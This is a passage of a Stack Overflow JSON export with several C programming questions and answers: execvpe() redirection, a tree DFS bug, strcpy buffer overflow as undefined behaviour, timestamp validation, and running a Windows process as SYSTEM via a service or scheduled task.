/stdout/1.txt\nif(0&gt;(fd=open(\"/stdout/1.txt\",O_WRONLY|O_TRUNC))){ perror(\"open\"); /*...*/ }\nif(0&gt;dup2(fd,1)){ perror(\"dup\"); /*...*/ }\nif(fd!=1) close(fd);\n\n// 2&gt;&amp;1\nif(0&gt;dup2(1,2)){ perror(\"dup\"); /*...*/ }\n</code></pre>\n"}], "owner": {"reputation": 216, "user_id": 7871971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1043c36db0dd84fab919fd9b8df32052?s=128&d=identicon&r=PG&f=1", "display_name": "SamratV", "link": "https://stackoverflow.com/users/7871971/samratv"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 659, "favorite_count": 0, "accepted_answer_id": 53307709, "answer_count": 1, "score": 1, "last_activity_date": 1542224694, "creation_date": 1542223682, "last_edit_date": 1542224121, "question_id": 53307488, "link": "https://stackoverflow.com/questions/53307488/how-to-use-execvpe-in-c-correctly", "title": "How to use execvpe() in C correctly?", "body": "<p>I am trying to run the compiled C code using <code>execvpe()</code> function in C. My code file is located at <code>/code/Solution.c</code>. I compiled it using the command <code>gcc /code/Solution.c -o /code/Solution</code>. I want to run the compiled code, i.e, the <code>/code/Solution</code> file using <code>execvpe()</code>. When I run it manually I use the command <code>./code/Solution &lt; /input/1.txt &amp;&gt; /stdout/1.txt</code> and it works perfectly but it gets stuck(the program never ends) when I try to do the same programmatically using <code>execvpe()</code>. Following is my code:</p>\n\n<pre><code>#define _GNU_SOURCE\n#include&lt;unistd.h&gt;\n#include&lt;stdio.h&gt;\n\nint main(){\n    char *args[] = {\"./Solution\", \"&lt;\", \"/input/1.txt\", \"&amp;&gt;\", \"/stdout/1.txt\", NULL};\n    char *env[]  = {\"PATH=/code\", NULL};\n    int x = execvpe(\"Solution\", args, env);\n    printf(\"%d\\n\", x);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "algorithm", "graph-theory", "microsoft-distributed-file-system"], "comments": [{"owner": {"reputation": 70549, "user_id": 4785185, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ChR5h.jpg?s=128&g=1", "display_name": "Prune", "link": "https://stackoverflow.com/users/4785185/prune"}, "edited": false, "score": 1, "creation_date": 1542223505, "post_id": 53307277, "comment_id": 93495497, "body": "Please adhere to the posting guidelines: supply the problem test case in your posting.  The link you gave does not permit general access; don&#39;t expect people to create an account specifically to diagnose your problem.  Just hard-code the example into your code -- reading input shouldn&#39;t be part of the problem, so it shouldn&#39;t be in this posting."}, {"owner": {"user_type": "does_not_exist", "display_name": "user10628441"}, "reply_to_user": {"reputation": 70549, "user_id": 4785185, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ChR5h.jpg?s=128&g=1", "display_name": "Prune", "link": "https://stackoverflow.com/users/4785185/prune"}, "edited": false, "score": 0, "creation_date": 1542223949, "post_id": 53307277, "comment_id": 93495700, "body": "done boss @Prune"}, {"owner": {"reputation": 15260, "user_id": 1968182, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/E5nF2.jpg?s=128&g=1", "display_name": "Ulrich Eckhardt", "link": "https://stackoverflow.com/users/1968182/ulrich-eckhardt"}, "edited": false, "score": 0, "creation_date": 1542225025, "post_id": 53307277, "comment_id": 93496143, "body": "Not done, replace the <code>scanf()</code> calls. The goal should be to provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. BTW: Do some research why using global variables is a bad idea, that may well cause your problems. Also, learn how to use a debugger to step through code."}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 0, "creation_date": 1542234412, "post_id": 53307277, "comment_id": 93500139, "body": "When your program is producing incorrect output, the correct thing to do is to use a debugger and trace through its execution.  You may also wish to work through it on paper.  You could add statements to display intermediate values during execution to test or debunk assumptions you&#39;re making.  The time to post a question on Stack Overflow is <i>after</i> you have done all the above."}], "answers": [{"tags": [], "owner": {"reputation": 823, "user_id": 5360439, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2af098829647e5301ac07f7dce222d18?s=128&d=identicon&r=PG&f=1", "display_name": "JohnKoch", "link": "https://stackoverflow.com/users/5360439/johnkoch"}, "is_accepted": false, "score": 0, "last_activity_date": 1542276495, "creation_date": 1542276495, "answer_id": 53316958, "question_id": 53307277, "link": "https://stackoverflow.com/questions/53307277/to-break-the-tree-in-even-number-of-nodes/53316958#53316958", "title": "to break the tree in even number of nodes", "body": "<p>There is a typo. The condition expression in <code>if</code> clause</p>\n\n<pre><code>if (visited[i] == 0 &amp;&amp; gph[i][j] == 1)\n</code></pre>\n\n<p>should be</p>\n\n<pre><code>if (visited[j] == 0 &amp;&amp; gph[i][j] == 1)\n</code></pre>\n\n<p>BTW, the constraints in hackrank question is <code>2 &lt;= n &lt;= 100</code>, so you definitely don't need a fixed array of size 201.</p>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user9728599"}, "is_accepted": true, "score": 0, "last_activity_date": 1542427747, "creation_date": 1542427747, "answer_id": 53348112, "question_id": 53307277, "link": "https://stackoverflow.com/questions/53307277/to-break-the-tree-in-even-number-of-nodes/53348112#53348112", "title": "to break the tree in even number of nodes", "body": "<pre><code>// ans is total number of edges removed and al is adjacency list of the tree.\nint dfs(int node) \n{\n    visit[node]=true;\n    int num_vertex=0;\n    for(int i=0;i&lt;al[node].size();i++)\n    {\n        if(!visit[al[node][i]])\n        {\n            int num_nodes=dfs(al[node][i]);\n            if(num_nodes%2==0)\n                ans++;\n            else\n                num_vertex+=num_nodes;\n        }\n    }\n    return num_vertex+1; \n}   \n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user10628441"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 113, "favorite_count": 0, "accepted_answer_id": 53348112, "answer_count": 2, "score": -2, "last_activity_date": 1542427747, "creation_date": 1542222886, "last_edit_date": 1592644375, "question_id": 53307277, "link": "https://stackoverflow.com/questions/53307277/to-break-the-tree-in-even-number-of-nodes", "title": "to break the tree in even number of nodes", "body": "<p>You are given a tree (a simple connected graph with no cycles).</p>\n<p>Find the maximum number of edges you can remove from the tree to get a forest such that each connected component of the forest contains an even number of nodes.</p>\n<p><a href=\"https://www.hackerrank.com/challenges/even-tree/problem\" rel=\"nofollow noreferrer\">https://www.hackerrank.com/challenges/even-tree/problem</a></p>\n<p>In the above link the test cases are given. For sampple input 1, I am getting  0 as output instead of expected value 2.</p>\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nint ans = 0;\nint v, e;\nint visited[201];\nint gph[201][201];\n\nint dfs(int i) {\n    int num_nodes;\n    int num_vertex = 0;\n    visited[i] = 1;\n    for (int j = 1; j &lt;= v; j++) {\n        if (visited[i] == 0 &amp;&amp; gph[i][j] == 1) {\n            num_nodes = dfs(j);\n            if (num_nodes % 2 == 0)\n                ans++;\n            else\n                num_vertex += num_nodes;\n        }\n    }\n    return num_vertex + 1;\n}\n\nint main() {\n    scanf(&quot;%d %d&quot;, &amp;v, &amp;e); // vertices and edges\n    int u, v;\n    for (int i = 0; i &lt; e; i++) {\n        scanf(&quot;%d %d&quot;, &amp;u, &amp;v); //edges of undirected graph\n        gph[u][v] = 1;\n        gph[v][u] = 1;\n    }\n    dfs(1);\n    printf(&quot;%d&quot;, ans);\n}\n</code></pre>\n<blockquote>\n<p>Test case:</p>\n<p>10 9\n2 1\n3 1\n4 3\n5 2\n6 1\n7 2\n8 6\n9 8\n10 8</p>\n</blockquote>\n<ul>\n<li><p>Expected output: <strong>2</strong></p>\n</li>\n<li><p>Actual output: <strong>0</strong></p>\n</li>\n</ul>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "edited": false, "score": 3, "creation_date": 1542222937, "post_id": 53307241, "comment_id": 93495251, "body": "Undefined behavior includes working perfectly fine."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1542223284, "post_id": 53307241, "comment_id": 93495401, "body": "Accidents will happen; it is an accident that it works.  It was not guaranteed to work; it was not guaranteed to fail.  You have undefined behaviour, and any response is legitimate.  Also, in this context, <code>sizeof()</code> is evaluated at compile time and doesn&#39;t change the result at runtime."}], "answers": [{"tags": [], "owner": {"reputation": 3805, "user_id": 3845803, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aG57R.jpg?s=128&g=1", "display_name": "Kon", "link": "https://stackoverflow.com/users/3845803/kon"}, "is_accepted": true, "score": 6, "last_activity_date": 1542223495, "last_edit_date": 1542223495, "creation_date": 1542222985, "answer_id": 53307310, "question_id": 53307241, "link": "https://stackoverflow.com/questions/53307241/giving-array-a-bigger-value-doesnt-increase-its-size/53307310#53307310", "title": "Giving array a bigger value doesn&#39;t increase its size?", "body": "<p>In this case, <code>name</code> is allocated to fit <code>\"longname\"</code>, which is 9 bytes. When you copy <code>\"evenlongername\"</code> into it, you're writing outside of bounds of that array. It's <em>undefined behavior</em> to write outside of the bounds, this means it may or may not work.  Some times, it'll work, other times you'll get seg fault, yet other times you'll get weird behavior.</p>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1542224012, "post_id": 53307397, "comment_id": 93495729, "body": "<code>strcpy()</code> is not dangerous.  It is an optimized function for a particular task.  If a coder needs to use &quot;safe&quot; functions even without understanding them, C is not the a language to use."}, {"owner": {"reputation": 7256, "user_id": 418966, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/81cf776adb922e444a0a771a8a4724e5?s=128&d=identicon&r=PG", "display_name": "Cyker", "link": "https://stackoverflow.com/users/418966/cyker"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542224189, "post_id": 53307397, "comment_id": 93495800, "body": "@chux well, that depends on how much an expert you are; i think most of the time it doesnt hurt calculating and adding the destination buffer size; but you are free to omit that if you are confident; if <code>strcpy</code> is really that safe to use then there isnt a reason to add <code>strncpy</code>?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1542224414, "post_id": 53307397, "comment_id": 93495904, "body": "<code>strncpy()</code> is not a &quot;safe&quot; version of <code>strcpy()</code>. Each has its place for different tasks."}, {"owner": {"reputation": 7256, "user_id": 418966, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/81cf776adb922e444a0a771a8a4724e5?s=128&d=identicon&r=PG", "display_name": "Cyker", "link": "https://stackoverflow.com/users/418966/cyker"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542224824, "post_id": 53307397, "comment_id": 93496081, "body": "@chux <code>strncpy()</code> is a &quot;safer&quot; version of <code>strcpy()</code>, in the sense that <code>strncpy()</code> is overflow-safe but <code>strcpy()</code> isnt; but you are still free to use either if you know that would work correctly in your program;"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542225130, "post_id": 53307397, "comment_id": 93496191, "body": "This is not only my view, <a href=\"https://stackoverflow.com/a/1258577\">Why should you use strncpy instead of strcpy?</a>.  The accepted answer promoting <code>strncpy()</code>, 109 Up and 26 down votes.   The higher rated <a href=\"https://stackoverflow.com/a/1258577/2410359\">answer</a> which does not promote <code>strncpy()</code> as safer has 152 up and 0 down votes."}, {"owner": {"reputation": 7256, "user_id": 418966, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/81cf776adb922e444a0a771a8a4724e5?s=128&d=identicon&r=PG", "display_name": "Cyker", "link": "https://stackoverflow.com/users/418966/cyker"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542226385, "post_id": 53307397, "comment_id": 93496777, "body": "@chux that link is helpful; my point is <code>strncpy()</code> is not by origin a bounded <code>strcpy()</code>, but in effect works almost like a bounded <code>strcpy()</code>; if you think neither is safe enough then you dont have to use any (<a href=\"https://github.com/git/git/commit/c8af66ab8ad7cd78557f0f9f5ef6a52fd46ee6dd\" rel=\"nofollow noreferrer\">1</a>, <a href=\"https://github.com/git/git/commit/e488b7aba743d23b830d239dcc33d9ca0745a9ad\" rel=\"nofollow noreferrer\">2</a>);"}], "tags": [], "owner": {"reputation": 7256, "user_id": 418966, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/81cf776adb922e444a0a771a8a4724e5?s=128&d=identicon&r=PG", "display_name": "Cyker", "link": "https://stackoverflow.com/users/418966/cyker"}, "is_accepted": false, "score": 3, "last_activity_date": 1542224888, "last_edit_date": 1542224888, "creation_date": 1542223283, "answer_id": 53307397, "question_id": 53307241, "link": "https://stackoverflow.com/questions/53307241/giving-array-a-bigger-value-doesnt-increase-its-size/53307397#53307397", "title": "Giving array a bigger value doesn&#39;t increase its size?", "body": "<blockquote>\n  <p>So the compiler affirms that the size of the array is still 9. How is it able to store the word 'evenlongername' which has a size of 15 bytes(including the string terminator)?</p>\n</blockquote>\n\n<p>You are using a dangerous function (see <a href=\"https://linux.die.net/man/3/strncpy\" rel=\"nofollow noreferrer\">Bugs</a>), <code>strcpy</code>, which blindly copies source string to destination buffer without knowing about its size; in your case of copying 15 bytes into a buffer with size 9 bytes, essentially you have overflown.  Your program <em>may</em> work fine if the memory access is valid and it doesn't overwrite something important.</p>\n\n<p>Because C is a lower-level programming language, a C <code>char[]</code> is \"barebone\" mapping of memory, and not a \"smart\" container like C++ <code>std::vector</code> which automatically manages its size for you as you dynamically add and remove elements. If you are still not clear about the philosophy of C in this, I'd recommend you read <a href=\"https://public-inbox.org/git/alpine.LFD.0.999.0709061839510.5626@evo.linux-foundation.org/\" rel=\"nofollow noreferrer\"><code>*YOU* are full of bullshit</code></a>. Very classic and rewarding.</p>\n"}, {"tags": [], "owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "is_accepted": false, "score": 2, "last_activity_date": 1542223532, "last_edit_date": 1542223532, "creation_date": 1542223312, "answer_id": 53307407, "question_id": 53307241, "link": "https://stackoverflow.com/questions/53307241/giving-array-a-bigger-value-doesnt-increase-its-size/53307407#53307407", "title": "Giving array a bigger value doesn&#39;t increase its size?", "body": "<p>Using <code>sizeof</code> on a char array will return the size of the buffer, not the length of the null-terminated string in the buffer. If you use <code>strcpy</code> to try and overflow the array, and it just happens to work (it's still undefined behavior), <code>sizeof</code> is still going to report the size used at declaration. That never changes.</p>\n\n<p>If what you're interested in is observing how the length of a string changes with different assignments:</p>\n\n<ol>\n<li>Use an adequate buffer to store every string you're going to test.</li>\n<li>Use the function <code>strlen</code> in <code>&lt;string.h&gt;</code> which will give you the actual length of the string, and not the length of your buffer, which, once declared, is constant.</li>\n</ol>\n"}], "owner": {"reputation": 575, "user_id": 9428499, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6668aa8accba025baec1e60d1a97cbfb?s=128&d=identicon&r=PG&f=1", "display_name": "Krish", "link": "https://stackoverflow.com/users/9428499/krish"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 1, "accepted_answer_id": 53307310, "answer_count": 3, "score": 1, "last_activity_date": 1542224888, "creation_date": 1542222732, "last_edit_date": 1542223613, "question_id": 53307241, "link": "https://stackoverflow.com/questions/53307241/giving-array-a-bigger-value-doesnt-increase-its-size", "title": "Giving array a bigger value doesn&#39;t increase its size?", "body": "<p>Here's what I did:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n\n    char name[] = \"longname\";\n    printf(\"Name = %s \\n\",name);\n    strcpy(name,\"evenlongername\");\n    printf(\"Name = %s \\n\",name);\n    printf(\"size of the array is : %d\",sizeof(name));\n    return 0;\n\n}\n</code></pre>\n\n<p>It works, but how? I thought that once memory is assigned to an array in a program, it is not possible to change it. But, the output of this program is:</p>\n\n<pre><code>Name = longname \nName = evenlongername \nsize of the array is 9\n</code></pre>\n\n<p>So the compiler affirms that the size of the array is still 9. How is it able to store the word 'evenlongername' which has a size of 15 bytes (including the string terminator)?</p>\n"}, {"tags": ["c", "algorithm", "embedded"], "comments": [{"owner": {"reputation": 11761, "user_id": 4964822, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oTZqV.jpg?s=128&g=1", "display_name": "nice_dev", "link": "https://stackoverflow.com/users/4964822/nice-dev"}, "edited": false, "score": 0, "creation_date": 1542222463, "post_id": 53306879, "comment_id": 93495046, "body": "If you know the string is in <code>YYYY-MM-DD HH:MM:SS</code> format, why do you need to pattern match it? Probably you mean extracting the <code>Y</code>,<code>M</code>,<code>D</code>,<code>H</code>,<code>M</code>,<code>S</code> values?"}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542222479, "post_id": 53306879, "comment_id": 93495055, "body": "Have you tried <code>strptime</code>?"}, {"owner": {"reputation": 51, "user_id": 2142141, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/374cda4a62e6d3dac84079a6463f3fc4?s=128&d=identicon&r=PG", "display_name": "Fever", "link": "https://stackoverflow.com/users/2142141/fever"}, "edited": false, "score": 0, "creation_date": 1542265513, "post_id": 53306879, "comment_id": 93508287, "body": "You&#39;re right. I miss expressed the question and it should have said validate instead of pattern matching. I have changed the title now."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1542312231, "post_id": 53306879, "comment_id": 93534614, "body": "It is a very narrow and simple requirement; unless you will be validating other differently formatted strings, a general purpose matching/validating library will add a prohibitively large amount of code.  Just read the delimited tokens and validate them - you will write perhaps more code, but that code will be smaller than any general purpose library code you might otherwise import."}], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 2142141, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/374cda4a62e6d3dac84079a6463f3fc4?s=128&d=identicon&r=PG", "display_name": "Fever", "link": "https://stackoverflow.com/users/2142141/fever"}, "edited": false, "score": 0, "creation_date": 1542265588, "post_id": 53307196, "comment_id": 93508315, "body": "I must say that I&#39;m impressed. Works like a charm! Thank you very much for your time."}, {"owner": {"reputation": 1637, "user_id": 131166, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/b139a6d5ea2ed82bcba6d23ea9e4e27c?s=128&d=identicon&r=PG", "display_name": "Sam Skuce", "link": "https://stackoverflow.com/users/131166/sam-skuce"}, "edited": false, "score": 0, "creation_date": 1542393242, "post_id": 53307196, "comment_id": 93565938, "body": "Why <code>year % 25</code> instead of <code>year % 100</code>?  They both end up working the same, but <code>% 100</code> uses the actual value the formula is based on (Not years divisible by 100, except years divisible by 400).  Just a preference to use the smallest number possible, or is there an efficiency gain I&#39;m missing?  I can certainly understand why you would avoid another division with <code>&amp; 15</code> instead of <code>% 400</code> though."}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 1, "creation_date": 1542393938, "post_id": 53307196, "comment_id": 93566246, "body": "Please have a look at the link in my answer: &quot;The 100th year test utilizes modulo 25 instead of modulo 100. We can do this because 100 factors out to 2 x 2 x 5 x 5. Because the 4th year test already checks for factors of 4 we can eliminate that factor from 100, leaving 25. This optimization is probably insignificant to nearly every CPU implementation (as both 100 and 25 fit in 8-bits).&quot;"}], "tags": [], "owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "is_accepted": true, "score": 1, "last_activity_date": 1542268974, "last_edit_date": 1542268974, "creation_date": 1542222595, "answer_id": 53307196, "question_id": 53306879, "link": "https://stackoverflow.com/questions/53306879/validating-timestamp-string-for-embedded-application/53307196#53307196", "title": "Validating timestamp string for embedded application", "body": "<p>By \"pattern-match\" I assume you want to know if such a string is valid.</p>\n\n<pre><code>#include &lt;stdbool.h&gt;\n#include &lt;string.h&gt;\n\nbool is_leap_year(int year)\n{\n    return (year &amp; 3) == 0 &amp;&amp; ((year % 25) != 0 || (year &amp; 15) == 0); // *)\n}\n\nbool in_range(int min, int value, int max)\n{\n    return min &lt;= value &amp;&amp; value &lt;= max;\n}\n\nbool is_valid_timestamp(char const *datetime)\n{\n    int const days_per_month[] = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };\n    int y, m, d, h, min, sec;\n    char seperators[5];\n\n    return strlen(datetime) == 19\n        &amp;&amp; sscanf(datetime, \"%d%c%d%c%d%c%d%c%d%c%d\", &amp;y, &amp;seperators[0],\n                  &amp;m, &amp;seperators[1], &amp;d, &amp;seperators[2], &amp;h, &amp;seperators[3], \n                  &amp;min, &amp;seperators[4], &amp;sec) == 11\n        &amp;&amp; in_range(0, y, 9999) &amp;&amp; in_range(1, m, 12)\n        &amp;&amp; in_range(1, d, m == 2 &amp;&amp; is_leap_year(y) ? 29 : days_per_month[m - 1])\n        &amp;&amp; in_range(0, h, 23) &amp;&amp; in_range(0, min, 59) &amp;&amp; in_range(0, sec, 59)\n        &amp;&amp; strncmp(seperators, \"-- ::\", 5) == 0;\n}\n</code></pre>\n\n<p><code>in_range(0, y, 9999)</code> ... or whatever you consider a \"valid\" year.</p>\n\n<p>*) <a href=\"https://stackoverflow.com/a/11595914/3975177\">https://stackoverflow.com/a/11595914/3975177</a></p>\n"}], "owner": {"reputation": 51, "user_id": 2142141, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/374cda4a62e6d3dac84079a6463f3fc4?s=128&d=identicon&r=PG", "display_name": "Fever", "link": "https://stackoverflow.com/users/2142141/fever"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "accepted_answer_id": 53307196, "answer_count": 1, "score": 1, "last_activity_date": 1542268974, "creation_date": 1542221193, "last_edit_date": 1542265416, "question_id": 53306879, "link": "https://stackoverflow.com/questions/53306879/validating-timestamp-string-for-embedded-application", "title": "Validating timestamp string for embedded application", "body": "<p>I need to validate a timestamp string for one of my embedded applications. The SDK does not provide regex.h so I need to come up with another solution.</p>\n\n<p>I been googling and found some lightweight regex alternatives on github but I wanted to see if there is a better/simpler alternative before I start to integrate that into the build.</p>\n\n<p>Any suggestion how to make such a function in C? The string will have the format: <strong>YYYY-MM-DD HH:MM:SS</strong>. I control this format too so if another is better I can adopt to that.</p>\n"}, {"tags": ["c", "windows", "winapi", "elevated-privileges"], "comments": [{"owner": {"reputation": 570607, "user_id": 505088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/3c0aac2191718ef0309dbc034d9b9961?s=128&d=identicon&r=PG", "display_name": "David Heffernan", "link": "https://stackoverflow.com/users/505088/david-heffernan"}, "edited": false, "score": 1, "creation_date": 1542219534, "post_id": 53306380, "comment_id": 93493660, "body": "Run it as a service under the local system account. Of course, one wonders why you feel the need to do this at all."}, {"owner": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "edited": false, "score": 0, "creation_date": 1542230063, "post_id": 53306380, "comment_id": 93498367, "body": "you can get token from system process or impersonate system thread, if you have debug privileges. and impersonate some your thread(s) with this system token, when you need do some task as <i>LocalSystem</i>. and anyway - what concrete you need ? some concrete privileges ? be membership of <i>S-1-5-18</i> or what ?"}, {"owner": {"reputation": 45, "user_id": 3725519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1b735fb111d7af9bc39d7b79c88eec1e?s=128&d=identicon&r=PG&f=1", "display_name": "user3725519", "link": "https://stackoverflow.com/users/3725519/user3725519"}, "reply_to_user": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "edited": false, "score": 0, "creation_date": 1542491125, "post_id": 53306380, "comment_id": 93589241, "body": "@RbMm I need in my program to load a driver. I am creating and starting a new service for the driver. My program also has GUI so I think I will load the driver with a thread running as system like you said"}, {"owner": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "edited": false, "score": 0, "creation_date": 1542491595, "post_id": 53306380, "comment_id": 93589343, "body": "but in this case i not understand for what you need run as <code>SYSTEM</code>. for load driver direct, via <code>ZwLoadDriver</code> you need <code>SE_LOAD_DRIVER_PRIVILEGE</code> privilege enabled (it usually have by admins). or if you do this via service manager - for create service you need be member of <i>Administrators</i>. for start already existing service - depend from it security descriptor but usually you also need be member of <i>Administrators</i>. in all case you not need <i>SYSTEM</i> token"}, {"owner": {"reputation": 45, "user_id": 3725519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1b735fb111d7af9bc39d7b79c88eec1e?s=128&d=identicon&r=PG&f=1", "display_name": "user3725519", "link": "https://stackoverflow.com/users/3725519/user3725519"}, "reply_to_user": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "edited": false, "score": 0, "creation_date": 1542492465, "post_id": 53306380, "comment_id": 93589569, "body": "@RbMm I have just realized I confused this with some other thing and when I tested the program with admin it worked. Thank you"}], "answers": [{"tags": [], "owner": {"reputation": 5181, "user_id": 5529197, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6af647bacfb3f0b596c73b0e3b0dc4b1?s=128&d=identicon&r=PG&f=1", "display_name": "Afshin", "link": "https://stackoverflow.com/users/5529197/afshin"}, "is_accepted": false, "score": 1, "last_activity_date": 1542219679, "creation_date": 1542219679, "answer_id": 53306527, "question_id": 53306380, "link": "https://stackoverflow.com/questions/53306380/program-escalates-itself-from-admin-to-system/53306527#53306527", "title": "Program escalates itself from admin to system", "body": "<p>Write a windows service. It will run as <code>SYSTEM</code> user by default. </p>\n\n<p>A simple tutorial is <a href=\"https://blogs.msdn.microsoft.com/sergey_babkins_blog/2016/12/28/windows-service-wrapper-in-c/\" rel=\"nofollow noreferrer\">here</a>, but remember that installing a service requires administrator privileges. </p>\n"}, {"tags": [], "owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "is_accepted": false, "score": 0, "last_activity_date": 1542221890, "creation_date": 1542221890, "answer_id": 53307039, "question_id": 53306380, "link": "https://stackoverflow.com/questions/53306380/program-escalates-itself-from-admin-to-system/53307039#53307039", "title": "Program escalates itself from admin to system", "body": "<p>Once you're running as administrator, here are some options:</p>\n\n<ol>\n<li><p>If you know you're not going to be using GUI functions, you can create a scheduled task that runs your same exe as NT AUTHORITY\\SYSTEM within a few seconds, and check within your code which account the process is running as.</p>\n\n<p>Copied from a 